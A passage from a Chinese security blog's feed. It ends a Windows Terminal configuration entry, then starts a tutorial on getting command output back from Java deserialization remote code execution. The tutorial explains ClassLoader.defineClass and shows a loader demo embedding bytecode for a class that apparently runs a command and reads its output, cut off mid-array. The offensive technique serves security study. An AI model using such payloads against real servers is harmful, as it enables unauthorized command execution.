class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"profiles"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the cmd.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"cmd.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.75</span>,</span><br><span class="line"><span class="comment">// 背景图片</span></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\13.jpg"</span>,</span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="comment">//"commandline": "cmd.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// 光标</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;.png"</span>,</span><br><span class="line"><span class="comment">//"name": "cmd",</span></span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="comment">// 打开窗口的路径</span></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">false</span></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make changes here to the powershell.exe profile</span></span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Windows PowerShell"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"powershell.exe"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\7s'd.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">// "commandline": "powershell.exe",</span></span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="comment">// 光标</span></span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"underscore"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;.png"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Powershell"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;"</span>,</span><br><span class="line"><span class="string">"hidden"</span>: <span class="keyword">false</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Azure Cloud Shell"</span>,</span><br><span class="line"><span class="string">"source"</span>: <span class="string">"Windows.Terminal.Azure"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//git-bash</span></span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Git-bash"</span>,</span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.5</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\3.jpg"</span>,</span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"D:\\Git\\bin\\bash.exe"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Fira Code Medium"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">12</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;1c4de342-38b7-51cf-b940-2309a097f489&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="comment">// "icon": "E:\\Git\\git-icon.png", </span></span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"D:\\Git\\icon\\1.jpg"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Bash"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"10, 10, 10, 10"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"Ubuntu (WSL)"</span>,</span><br><span class="line"><span class="comment">//"tabTitle": "Ubuntu (WSL)",</span></span><br><span class="line"><span class="string">"acrylicOpacity"</span>: <span class="number">0.1</span>,</span><br><span class="line"><span class="string">"backgroundImage"</span>: <span class="string">"D:\\Git\\icon\\4.jpg"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"backgroundImageOpacity"</span>: <span class="number">0.9</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"closeOnExit"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"colorScheme"</span>: <span class="string">"Campbell"</span>,</span><br><span class="line"><span class="comment">//"colorScheme": "CMD",</span></span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">"wsl.exe -d Ubuntu"</span>,</span><br><span class="line"><span class="string">"cursorColor"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"><span class="string">"cursorShape"</span>: <span class="string">"bar"</span>,</span><br><span class="line"><span class="string">"fontFace"</span>: <span class="string">"Consolas"</span>,</span><br><span class="line"><span class="string">"fontSize"</span>: <span class="number">13</span>,</span><br><span class="line"><span class="string">"guid"</span>: <span class="string">"&#123;2c4de342-38b7-51cf-b940-2309a097f518&#125;"</span>,</span><br><span class="line"><span class="string">"historySize"</span>: <span class="number">9001</span>,</span><br><span class="line"><span class="string">"icon"</span>: <span class="string">"ms-appx:///ProfileIcons/&#123;9acb9455-ca41-5af7-950f-6bca1bc9722f&#125;.png"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Ubuntu"</span>,</span><br><span class="line"><span class="string">"padding"</span>: <span class="string">"0, 0, 0, 0"</span>,</span><br><span class="line"><span class="string">"snapOnInput"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"useAcrylic"</span>: <span class="keyword">true</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add custom color schemes to this array</span></span><br><span class="line"><span class="string">"schemes"</span>: [</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"background"</span>: <span class="string">"#000000"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"black"</span>: <span class="string">"#0C0C0C"</span>,</span><br><span class="line"><span class="string">"blue"</span>: <span class="string">"#0037DA"</span>,</span><br><span class="line"><span class="string">"brightBlack"</span>: <span class="string">"#767676"</span>,</span><br><span class="line"><span class="string">"brightBlue"</span>: <span class="string">"#3B78FF"</span>,</span><br><span class="line"><span class="string">"brightCyan"</span>: <span class="string">"#61D6D6"</span>,</span><br><span class="line"><span class="string">"brightGreen"</span>: <span class="string">"#16C60C"</span>,</span><br><span class="line"><span class="string">"brightPurple"</span>: <span class="string">"#B4009E"</span>,</span><br><span class="line"><span class="string">"brightRed"</span>: <span class="string">"#E74856"</span>,</span><br><span class="line"><span class="string">"brightWhite"</span>: <span class="string">"#F2F2F2"</span>,</span><br><span class="line"><span class="string">"brightYellow"</span>: <span class="string">"#F9F1A5"</span>,</span><br><span class="line"><span class="string">"cyan"</span>: <span class="string">"#3A96DD"</span>,</span><br><span class="line"><span class="string">"foreground"</span>: <span class="string">"#FFFFFF"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"green"</span>: <span class="string">"#13A10E"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Brogrammer"</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">"purple"</span>: <span class="string">"#881798"</span>,</span><br><span class="line"><span class="string">"red"</span>: <span class="string">"#C50F1F"</span>,</span><br><span class="line"><span class="string">"white"</span>: <span class="string">"#CCCCCC"</span>,</span><br><span class="line"><span class="string">"yellow"</span>: <span class="string">"#C19C00"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">],</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add any keybinding overrides to this array.</span></span><br><span class="line"><span class="comment">// To unbind a default keybinding, set the command to "unbound"</span></span><br><span class="line"><span class="string">"keybindings"</span>: [</span><br><span class="line"><span class="comment">// 关闭所有的窗口</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeWindow"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 新建一个窗口</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"newTab"</span>,</span><br><span class="line"><span class="string">"commandline"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"startingDirectory"</span>: <span class="string">"./"</span>,</span><br><span class="line"><span class="string">"tabTitle"</span>: <span class="string">"CMD"</span>,</span><br><span class="line"><span class="string">"index"</span>: <span class="number">0</span>,</span><br><span class="line"><span class="string">"profile"</span>: <span class="string">"CMD"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"alt+q"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 复制快捷键</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: &#123;</span><br><span class="line"><span class="string">"action"</span>: <span class="string">"copy"</span>,</span><br><span class="line"><span class="string">"singleLine"</span>: <span class="keyword">false</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+c"</span> ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// 粘贴快捷键</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"paste"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [ <span class="string">"ctrl+v"</span> ]</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"><span class="comment">// 关闭当前选项卡</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"command"</span>: <span class="string">"closeTab"</span>,</span><br><span class="line"><span class="string">"keys"</span>: [</span><br><span class="line"><span class="string">"shift+q"</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md" target="_blank" rel="noopener">https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md</a><br><a href="https://www.cnblogs.com/KiraYoshikage/p/11443741.html" target="_blank" rel="noopener">https://www.cnblogs.com/KiraYoshikage/p/11443741.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java 反序列化" scheme="https://summersec.github.io/tags/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化链回显解决方案</title>
    <link href="https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>https://summersec.github.io/2020/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</id>
    <published>2020-06-01T11:01:42.000Z</published>
    <updated>2021-01-18T06:18:54.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>&emsp;&emsp; 这是一篇本应该早就完成的文章，但是由于各种原因拖延至此。之前有读者就催我，但是实在是各种事情缠身，加上自己颓废了一段时间导致现在才公布。之后可能会断更一段时间关于代码审计方面文章，时间暂不确定。其实有几个题材早也确定，但是实在是没时间去整理素材，加上项目的更新，让我变得更加繁忙，在此给位先说一声对不起。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&emsp;&emsp; 大多数Java反序列化漏洞都能执行命令，导致RCE。小伙伴们有没有想过网络上大多数<code>payload</code>都是以弹计算机为止，但目标主机有没有弹计算机，或者执行其他的命令的时候我们是并不知道的，因为没有回显任何的结果。这篇文章以反序列化漏洞的回显为题，教你解决如何解决反序列化漏洞回显。</p><p>PS: 为避免代码太长而导致的阅读效果，故将完整的实验代码全部已经上传至 <a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">https://github.com/SummerSec/JavaLearnVulnerability</a></p><hr><h1 id="defineclass异常回显"><a href="#defineclass异常回显" class="headerlink" title="defineclass异常回显"></a>defineclass异常回显</h1><p>&emsp;&emsp; defineclass是<code>java.lang.ClassLoader</code>类下的一个类方法，将字节码转化为Class类。<br><img src="https://img-blog.csdnimg.cn/20200605103739371.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200605103901837.png" alt="在这里插入图片描述"></p><hr><h2 id="ClassLoder-类加载机制"><a href="#ClassLoder-类加载机制" class="headerlink" title="ClassLoder 类加载机制"></a>ClassLoder 类加载机制</h2><p>&emsp;&emsp; Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。</p><p><img src="https://img-blog.csdnimg.cn/20200524095720286.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 类加载器有三个，根加载器<code>Bootstrap</code>、平台类加载器<code>PlatformClassLoader</code>以及用户类加载器<code>AppClassLoader</code>。用户也可以自定义类加载器，自定义的类加载器需要继承<code>ClassLoader</code>类。</p><p><img src="https://img-blog.csdnimg.cn/20200524110624558.png" alt="在这里插入图片描述"></p><hr><h2 id="类加载demo"><a href="#类加载demo" class="headerlink" title="类加载demo"></a>类加载demo</h2><p>&emsp;&emsp; 下面给出的是一个完整的用户自定义加载器加载类字节码的DEMO，Summer类字节码怎么获取下文会讲解，目前先看一下类加载器的实现。</p><blockquote><p>温馨提示：如果使用笔者在GitHub上项目，请先将Summer类删除，或者移到其他地方。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo2</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Summer类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">"summer.classload.Summer"</span>;</span><br><span class="line">    <span class="comment">// Summer.class类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span 